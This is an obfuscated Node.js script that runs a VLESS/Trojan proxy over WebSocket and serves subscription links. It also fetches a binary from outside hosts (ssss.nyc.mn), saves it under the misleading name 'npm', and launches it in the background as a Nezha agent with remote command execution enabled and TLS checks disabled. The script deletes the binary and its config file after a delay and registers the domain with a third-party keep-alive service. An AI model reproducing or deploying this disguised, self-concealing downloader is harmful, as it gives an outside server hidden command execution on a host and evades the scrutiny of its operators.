const _0x4e0139=_0xa34c;(function(_0x5c44d9,_0x116bba){const _0x1fcae8=_0xa34c,_0x3ec661=_0x5c44d9();while(!![]){try{const _0x95a24b=-parseInt(_0x1fcae8(0x235))/0x1*(parseInt(_0x1fcae8(0x1d9))/0x2)+parseInt(_0x1fcae8(0x23c))/0x3*(-parseInt(_0x1fcae8(0x220))/0x4)+parseInt(_0x1fcae8(0x218))/0x5*(-parseInt(_0x1fcae8(0x22d))/0x6)+parseInt(_0x1fcae8(0x1c6))/0x7*(-parseInt(_0x1fcae8(0x1c5))/0x8)+parseInt(_0x1fcae8(0x20c))/0x9+parseInt(_0x1fcae8(0x1e0))/0xa+parseInt(_0x1fcae8(0x1f5))/0xb;if(_0x95a24b===_0x116bba)break;else _0x3ec661['push'](_0x3ec661['shift']());}catch(_0x24fc44){_0x3ec661['push'](_0x3ec661['shift']());}}}(_0xfb24,0xe8cdf));const os=require('os'),http=require(_0x4e0139(0x208)),fs=require('fs'),axios=require(_0x4e0139(0x234)),net=require(_0x4e0139(0x21b)),path=require(_0x4e0139(0x1d3)),crypto=require(_0x4e0139(0x1ff)),{Buffer}=require(_0x4e0139(0x1e4)),{exec,execSync}=require(_0x4e0139(0x230)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x4e0139(0x22c),NEZHA_SERVER=process[_0x4e0139(0x1f3)][_0x4e0139(0x1f1)]||'',NEZHA_PORT=process['env'][_0x4e0139(0x1f6)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env'][_0x4e0139(0x1e6)]||_0x4e0139(0x1e8),AUTO_ACCESS=process[_0x4e0139(0x1f3)][_0x4e0139(0x1d1)]||!![],WSPATH=process['env'][_0x4e0139(0x20e)]||UUID[_0x4e0139(0x227)](0x0,0x8),SUB_PATH=process[_0x4e0139(0x1f3)][_0x4e0139(0x1cf)]||_0x4e0139(0x21e),NAME=process[_0x4e0139(0x1f3)]['NAME']||'',PORT=process[_0x4e0139(0x1f3)][_0x4e0139(0x213)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x492d27=_0x4e0139;try{const _0x117f8b=await axios[_0x492d27(0x1c0)]('https://api.ip.sb/geoip'),_0x6b5eec=_0x117f8b[_0x492d27(0x1f8)];ISP=(_0x6b5eec[_0x492d27(0x20a)]+'-'+_0x6b5eec[_0x492d27(0x1f2)])[_0x492d27(0x210)](/ /g,'_');}catch(_0x589667){ISP=_0x492d27(0x1e5);}};GetISP();const httpServer=http[_0x4e0139(0x1e1)]((_0x142527,_0x2e95ff)=>{const _0xb6d09c=_0x4e0139;if(_0x142527['url']==='/'){const _0x265b25=path[_0xb6d09c(0x22f)](__dirname,_0xb6d09c(0x1f0));fs[_0xb6d09c(0x1e7)](_0x265b25,_0xb6d09c(0x239),(_0x4a8f70,_0x340354)=>{const _0x26968a=_0xb6d09c;if(_0x4a8f70){_0x2e95ff[_0x26968a(0x215)](0xc8,{'Content-Type':_0x26968a(0x1c8)}),_0x2e95ff[_0x26968a(0x1fc)](_0x26968a(0x217));return;}_0x2e95ff['writeHead'](0xc8,{'Content-Type':_0x26968a(0x1c8)}),_0x2e95ff[_0x26968a(0x1fc)](_0x340354);});return;}else{if(_0x142527['url']==='/'+SUB_PATH){const _0x573727=NAME?NAME+'-'+ISP:ISP,_0x474f02=_0xb6d09c(0x209)+UUID+'@'+DOMAIN+_0xb6d09c(0x1c3)+DOMAIN+_0xb6d09c(0x1d8)+DOMAIN+_0xb6d09c(0x1f7)+WSPATH+'#'+_0x573727,_0x3f36ac=_0xb6d09c(0x1ef)+UUID+'@'+DOMAIN+_0xb6d09c(0x22b)+DOMAIN+_0xb6d09c(0x1d8)+DOMAIN+_0xb6d09c(0x1f7)+WSPATH+'#'+_0x573727,_0x14f78a=_0x474f02+'\x0a'+_0x3f36ac,_0x1ea978=Buffer[_0xb6d09c(0x216)](_0x14f78a)[_0xb6d09c(0x1cb)]('base64');_0x2e95ff[_0xb6d09c(0x215)](0xc8,{'Content-Type':_0xb6d09c(0x1d2)}),_0x2e95ff['end'](_0x1ea978+'\x0a');}else _0x2e95ff[_0xb6d09c(0x215)](0x194,{'Content-Type':_0xb6d09c(0x1d2)}),_0x2e95ff[_0xb6d09c(0x1fc)](_0xb6d09c(0x205));}}),wss=new WebSocket[(_0x4e0139(0x1c1))]({'server':httpServer}),uuid=UUID[_0x4e0139(0x210)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4e0139(0x1ee)];function resolveHost(_0x3859bb){return new Promise((_0x2ea1b4,_0x2dd0e7)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3859bb)){_0x2ea1b4(_0x3859bb);return;}let _0x54e926=0x0;function _0x135be3(){const _0x45cf5d=_0xa34c;if(_0x54e926>=DNS_SERVERS['length']){_0x2dd0e7(new Error('Failed\x20to\x20resolve\x20'+_0x3859bb+_0x45cf5d(0x1f4)));return;}const _0x3e635e=DNS_SERVERS[_0x54e926];_0x54e926++;const _0x44c064=_0x45cf5d(0x20f)+encodeURIComponent(_0x3859bb)+'&type=A';axios[_0x45cf5d(0x1c0)](_0x44c064,{'timeout':0x1388,'headers':{'Accept':_0x45cf5d(0x201)}})[_0x45cf5d(0x22a)](_0x4e5c23=>{const _0x532584=_0x45cf5d,_0x5b0396=_0x4e5c23[_0x532584(0x1f8)];if(_0x5b0396[_0x532584(0x23d)]===0x0&&_0x5b0396[_0x532584(0x1eb)]&&_0x5b0396[_0x532584(0x1eb)][_0x532584(0x20d)]>0x0){const _0x49691a=_0x5b0396[_0x532584(0x1eb)]['find'](_0x50a485=>_0x50a485['type']===0x1);if(_0x49691a){_0x2ea1b4(_0x49691a[_0x532584(0x1f8)]);return;}}_0x135be3();})['catch'](_0x52ee79=>{_0x135be3();});}_0x135be3();});}function handleVlessConnection(_0x514f87,_0x510f79){const _0x23d9a4=_0x4e0139,[_0x1c2331]=_0x510f79,_0x1c3123=_0x510f79[_0x23d9a4(0x227)](0x1,0x11);if(!_0x1c3123[_0x23d9a4(0x21c)]((_0x52c063,_0x5c7b80)=>_0x52c063==parseInt(uuid[_0x23d9a4(0x1d6)](_0x5c7b80*0x2,0x2),0x10)))return![];let _0x30635a=_0x510f79[_0x23d9a4(0x227)](0x11,0x12)[_0x23d9a4(0x1f9)]()+0x13;const _0x36b32a=_0x510f79[_0x23d9a4(0x227)](_0x30635a,_0x30635a+=0x2)[_0x23d9a4(0x211)](0x0),_0x494eb2=_0x510f79[_0x23d9a4(0x227)](_0x30635a,_0x30635a+=0x1)[_0x23d9a4(0x1f9)](),_0x1b6364=_0x494eb2==0x1?_0x510f79[_0x23d9a4(0x227)](_0x30635a,_0x30635a+=0x4)['join']('.'):_0x494eb2==0x2?new TextDecoder()['decode'](_0x510f79[_0x23d9a4(0x227)](_0x30635a+0x1,_0x30635a+=0x1+_0x510f79[_0x23d9a4(0x227)](_0x30635a,_0x30635a+0x1)[_0x23d9a4(0x1f9)]())):_0x494eb2==0x3?_0x510f79['slice'](_0x30635a,_0x30635a+=0x10)[_0x23d9a4(0x23e)]((_0x260d85,_0x47e0a1,_0x404030,_0x4d13de)=>_0x404030%0x2?_0x260d85[_0x23d9a4(0x23b)](_0x4d13de[_0x23d9a4(0x227)](_0x404030-0x1,_0x404030+0x1)):_0x260d85,[])[_0x23d9a4(0x23a)](_0x2f3e66=>_0x2f3e66['readUInt16BE'](0x0)[_0x23d9a4(0x1cb)](0x10))[_0x23d9a4(0x22f)](':'):'';_0x514f87['send'](new Uint8Array([_0x1c2331,0x0]));const _0x3c7b09=createWebSocketStream(_0x514f87);return resolveHost(_0x1b6364)[_0x23d9a4(0x22a)](_0xba1164=>{const _0x3c458f=_0x23d9a4;net[_0x3c458f(0x21f)]({'host':_0xba1164,'port':_0x36b32a},function(){const _0x329083=_0x3c458f;this[_0x329083(0x20b)](_0x510f79['slice'](_0x30635a)),_0x3c7b09['on'](_0x329083(0x233),()=>{})[_0x329083(0x238)](this)['on'](_0x329083(0x233),()=>{})['pipe'](_0x3c7b09);})['on'](_0x3c458f(0x233),()=>{});})[_0x23d9a4(0x221)](_0x31002f=>{const _0x33e88a=_0x23d9a4;net[_0x33e88a(0x21f)]({'host':_0x1b6364,'port':_0x36b32a},function(){const _0x1806f0=_0x33e88a;this[_0x1806f0(0x20b)](_0x510f79[_0x1806f0(0x227)](_0x30635a)),_0x3c7b09['on'](_0x1806f0(0x233),()=>{})[_0x1806f0(0x238)](this)['on'](_0x1806f0(0x233),()=>{})[_0x1806f0(0x238)](_0x3c7b09);})['on'](_0x33e88a(0x233),()=>{});}),!![];}function _0xfb24(){const _0xa1fac9=['Not\x20Found\x0a','hex','writeFileSync','http','vless://','country_code','write','16756695DQatHQ','length','WSPATH','https://dns.google/resolve?name=','replace','readUInt16BE','arm','PORT','utf-8','writeHead','from','Hello\x20world!','188935aQjQRG','2053','2087','net','every','digest','sub','connect','610976sWNHHM','catch','443','npm\x20download\x20successfully','stream','--tls','https://arm64.ssss.nyc.mn/v1','slice','https://arm64.ssss.nyc.mn/agent','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','then',':443?security=tls&sni=','314d8bbd-d17d-4cbe-a740-e5f1d215ce7b','294JBgELA','unlink','join','child_process','npm\x20running\x20error:','connection','error','axios','14543krdktx','8443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','pipe','utf8','map','concat','24LAgzAc','Status','reduce','get','Server','sha224',':443?encryption=none&security=tls&sni=','config.yaml','8SqGqYL','5291839nSJlZt','close','text/html','https://amd64.ssss.nyc.mn/v1','true','toString','arch','update','finish','SUB_PATH','false','AUTO_ACCESS','text/plain','path','error:\x20','aarch64','substr','message','&fp=chrome&type=ws&host=','38yvmRCK','createWriteStream','split','createHash','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://','811610hbuVQa','createServer','npm','setsid\x20nohup\x20./npm\x20-s\x20','buffer','Unknown','DOMAIN','readFile','1234.abc.com','once','Automatic\x20Access\x20Task\x20added\x20successfully','Answer','chmod\x20+x\x20npm','log','1.1.1.1','trojan://','index.html','NEZHA_SERVER','isp','env','\x20with\x20all\x20DNS\x20servers','34279960KoyQcH','NEZHA_PORT','&path=%2F','data','readUInt8','client_secret:\x20','/bin/bash','end','includes','2096','crypto','pop','application/dns-json','Server\x20is\x20running\x20on\x20port\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','arm64'];_0xfb24=function(){return _0xa1fac9;};return _0xfb24();}function handleTrojanConnection(_0x9ef6e9,_0x43dc67){const _0x97d13c=_0x4e0139;try{if(_0x43dc67['length']<0x3a)return![];const _0x50087c=_0x43dc67[_0x97d13c(0x227)](0x0,0x38)[_0x97d13c(0x1cb)](),_0x233dc1=[UUID];let _0x5bb1cc=null;for(const _0x2b6a39 of _0x233dc1){const _0x1e7d76=crypto[_0x97d13c(0x1dc)](_0x97d13c(0x1c2))[_0x97d13c(0x1cd)](_0x2b6a39)[_0x97d13c(0x21d)](_0x97d13c(0x206));if(_0x1e7d76===_0x50087c){_0x5bb1cc=_0x2b6a39;break;}}if(!_0x5bb1cc)return![];let _0x2f2bae=0x38;_0x43dc67[_0x2f2bae]===0xd&&_0x43dc67[_0x2f2bae+0x1]===0xa&&(_0x2f2bae+=0x2);const _0x55fdd9=_0x43dc67[_0x2f2bae];if(_0x55fdd9!==0x1)return![];_0x2f2bae+=0x1;const _0xd74334=_0x43dc67[_0x2f2bae];_0x2f2bae+=0x1;let _0x20cdad,_0x9c8aad;if(_0xd74334===0x1)_0x20cdad=_0x43dc67[_0x97d13c(0x227)](_0x2f2bae,_0x2f2bae+0x4)['join']('.'),_0x2f2bae+=0x4;else{if(_0xd74334===0x3){const _0x58a5b0=_0x43dc67[_0x2f2bae];_0x2f2bae+=0x1,_0x20cdad=_0x43dc67[_0x97d13c(0x227)](_0x2f2bae,_0x2f2bae+_0x58a5b0)[_0x97d13c(0x1cb)](),_0x2f2bae+=_0x58a5b0;}else{if(_0xd74334===0x4)_0x20cdad=_0x43dc67[_0x97d13c(0x227)](_0x2f2bae,_0x2f2bae+0x10)[_0x97d13c(0x23e)]((_0x289035,_0xea2afe,_0x549b0e,_0x358c62)=>_0x549b0e%0x2?_0x289035[_0x97d13c(0x23b)](_0x358c62[_0x97d13c(0x227)](_0x549b0e-0x1,_0x549b0e+0x1)):_0x289035,[])[_0x97d13c(0x23a)](_0xfb2b83=>_0xfb2b83[_0x97d13c(0x211)](0x0)[_0x97d13c(0x1cb)](0x10))[_0x97d13c(0x22f)](':'),_0x2f2bae+=0x10;else return![];}}_0x9c8aad=_0x43dc67[_0x97d13c(0x211)](_0x2f2bae),_0x2f2bae+=0x2;_0x2f2bae<_0x43dc67['length']&&_0x43dc67[_0x2f2bae]===0xd&&_0x43dc67[_0x2f2bae+0x1]===0xa&&(_0x2f2bae+=0x2);const _0x78b1c1=createWebSocketStream(_0x9ef6e9);return resolveHost(_0x20cdad)[_0x97d13c(0x22a)](_0x556591=>{const _0x411672=_0x97d13c;net[_0x411672(0x21f)]({'host':_0x556591,'port':_0x9c8aad},function(){const _0x26c99=_0x411672;_0x2f2bae<_0x43dc67[_0x26c99(0x20d)]&&this[_0x26c99(0x20b)](_0x43dc67[_0x26c99(0x227)](_0x2f2bae)),_0x78b1c1['on']('error',()=>{})['pipe'](this)['on'](_0x26c99(0x233),()=>{})[_0x26c99(0x238)](_0x78b1c1);})['on'](_0x411672(0x233),()=>{});})[_0x97d13c(0x221)](_0x5378c5=>{const _0x38ec0d=_0x97d13c;net['connect']({'host':_0x20cdad,'port':_0x9c8aad},function(){const _0x4cd569=_0xa34c;_0x2f2bae<_0x43dc67[_0x4cd569(0x20d)]&&this[_0x4cd569(0x20b)](_0x43dc67['slice'](_0x2f2bae)),_0x78b1c1['on']('error',()=>{})['pipe'](this)['on'](_0x4cd569(0x233),()=>{})[_0x4cd569(0x238)](_0x78b1c1);})['on'](_0x38ec0d(0x233),()=>{});}),!![];}catch(_0x375cae){return![];}}wss['on'](_0x4e0139(0x232),(_0x475eae,_0x611648)=>{const _0x44b8a9=_0x4e0139,_0x5265fa=_0x611648['url']||'';_0x475eae[_0x44b8a9(0x1e9)](_0x44b8a9(0x1d7),_0x2cb51e=>{const _0xa3a391=_0x44b8a9;if(_0x2cb51e[_0xa3a391(0x20d)]>0x11&&_0x2cb51e[0x0]===0x0){const _0xeb2e6e=_0x2cb51e[_0xa3a391(0x227)](0x1,0x11),_0x4321e2=_0xeb2e6e['every']((_0x1d93c7,_0x2c77e7)=>_0x1d93c7==parseInt(uuid['substr'](_0x2c77e7*0x2,0x2),0x10));if(_0x4321e2){!handleVlessConnection(_0x475eae,_0x2cb51e)&&_0x475eae[_0xa3a391(0x1c7)]();return;}}!handleTrojanConnection(_0x475eae,_0x2cb51e)&&_0x475eae['close']();})['on'](_0x44b8a9(0x233),()=>{});});function _0xa34c(_0x34969a,_0x40565d){_0x34969a=_0x34969a-0x1c0;const _0xfb2414=_0xfb24();let _0xa34c8=_0xfb2414[_0x34969a];return _0xa34c8;}const getDownloadUrl=()=>{const _0x11b020=_0x4e0139,_0x492951=os[_0x11b020(0x1cc)]();return _0x492951===_0x11b020(0x212)||_0x492951===_0x11b020(0x204)||_0x492951===_0x11b020(0x1d5)?!NEZHA_PORT?_0x11b020(0x226):_0x11b020(0x228):!NEZHA_PORT?_0x11b020(0x1c9):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x9de4b9=_0x4e0139;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x37fbc1=getDownloadUrl(),_0x2e2958=await axios({'method':_0x9de4b9(0x1c0),'url':_0x37fbc1,'responseType':_0x9de4b9(0x224)}),_0x5f12e5=fs[_0x9de4b9(0x1da)]('npm');return _0x2e2958[_0x9de4b9(0x1f8)]['pipe'](_0x5f12e5),new Promise((_0x3dfb56,_0x565cf4)=>{const _0x5f0f73=_0x9de4b9;_0x5f12e5['on'](_0x5f0f73(0x1ce),()=>{const _0x444af8=_0x5f0f73;console[_0x444af8(0x1ed)](_0x444af8(0x223)),exec(_0x444af8(0x1ec),_0x2635eb=>{if(_0x2635eb)_0x565cf4(_0x2635eb);_0x3dfb56();});}),_0x5f12e5['on']('error',_0x565cf4);});}catch(_0x54baa6){throw _0x54baa6;}},runnz=async()=>{const _0x54fc64=_0x4e0139;try{const _0xbd7a19=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x54fc64(0x214)});if(_0xbd7a19['trim']()!==''){console[_0x54fc64(0x1ed)](_0x54fc64(0x203));return;}}catch(_0x4ab9ea){}await downloadFile();let _0x1cd016='',_0x260f72=[_0x54fc64(0x222),_0x54fc64(0x236),_0x54fc64(0x1fe),_0x54fc64(0x21a),'2083',_0x54fc64(0x219)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x580de1=_0x260f72[_0x54fc64(0x1fd)](NEZHA_PORT)?_0x54fc64(0x225):'';_0x1cd016=_0x54fc64(0x1e3)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x580de1+_0x54fc64(0x1dd);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x58428f=NEZHA_SERVER[_0x54fc64(0x1fd)](':')?NEZHA_SERVER[_0x54fc64(0x1db)](':')[_0x54fc64(0x200)]():'',_0x3ee9e1=_0x260f72['includes'](_0x58428f)?_0x54fc64(0x1ca):_0x54fc64(0x1d0),_0x2a32a6=_0x54fc64(0x1fa)+NEZHA_KEY+_0x54fc64(0x229)+NEZHA_SERVER+_0x54fc64(0x237)+_0x3ee9e1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x54fc64(0x207)](_0x54fc64(0x1c4),_0x2a32a6);}_0x1cd016=_0x54fc64(0x1de);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1cd016,{'shell':_0x54fc64(0x1fb)},_0x59f388=>{const _0x80d373=_0x54fc64;if(_0x59f388)console[_0x80d373(0x233)](_0x80d373(0x231),_0x59f388);else console[_0x80d373(0x1ed)]('npm\x20is\x20running');});}catch(_0x2c75a0){console['error'](_0x54fc64(0x1d4)+_0x2c75a0);}};async function addAccessTask(){const _0x4e0d42=_0x4e0139;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1e58a9=_0x4e0d42(0x1df)+DOMAIN;try{const _0x5e60ff=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x1e58a9},{'headers':{'Content-Type':'application/json'}});console['log'](_0x4e0d42(0x1ea));}catch(_0x5e9da8){}}const delFiles=()=>{const _0x46fc44=_0x4e0139;fs[_0x46fc44(0x22e)](_0x46fc44(0x1e2),()=>{}),fs[_0x46fc44(0x22e)](_0x46fc44(0x1c4),()=>{});};httpServer['listen'](PORT,()=>{const _0x378ce7=_0x4e0139;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x378ce7(0x1ed)](_0x378ce7(0x202)+PORT);});
